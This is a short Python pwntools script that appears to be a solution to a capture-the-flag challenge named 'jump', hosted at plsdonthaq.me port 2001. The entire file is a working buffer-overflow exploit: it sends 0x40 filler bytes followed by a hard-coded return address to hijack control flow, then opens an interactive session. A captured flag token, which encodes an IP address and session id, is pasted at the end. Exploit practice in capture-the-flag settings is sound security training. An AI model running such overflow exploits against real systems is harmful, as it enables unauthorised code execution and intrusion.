#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./jump"
    ip   = "plsdonthaq.me"
    port = 2001

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

payload = b"A" * 0x40
payload += p32(0x08048536)
p.sendlineafter("work ?", payload)

p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMi1qdW1wIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiJhOWVlOWI2Mi1jOTNiLTQzOWItYjFkZC1kMzlhZTUxMmI2MTgifQ.1UwY32DXsbRwEyhlPEaBD2nyqA7g7OqQFiixenuufhk}